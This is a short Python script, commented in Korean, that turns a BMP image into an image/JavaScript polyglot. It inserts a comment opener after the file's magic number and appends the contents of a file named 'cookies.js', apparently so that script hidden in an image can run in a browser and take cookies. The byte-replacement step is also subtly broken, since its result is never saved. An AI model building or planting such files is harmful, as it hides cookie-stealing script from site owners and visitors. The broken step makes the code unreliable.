fname = 'img.bmp'

#이진파일 읽기전용모드
pfile = open(fname, "r+b")
buff = pfile.read()
# *과 /는 x00 즉 공백으로 대체함
buff.replace(b'\x2A\x2F', b'\x00\x00')
pfile.close()

#쓰기모드
pfile = open(fname, "w+b")
pfile.write(buff)
#파일 읽기 커서를 시작기준에서 2칸 뒤로 이동
pfile.seek(2,0)
#매직넘버 뒤에 /* 주석문을 삽입한다.
pfile.write(b'\x2F\x2A')
pfile.close()

#추가모드
pfile = open(fname, "a+b")
pfile.write(b'\xFF\x2A\x2F\x3D\x31\x3B')#주석 끝
pfile.write(open ('cookies.js', 'rb').read())
pfile.close()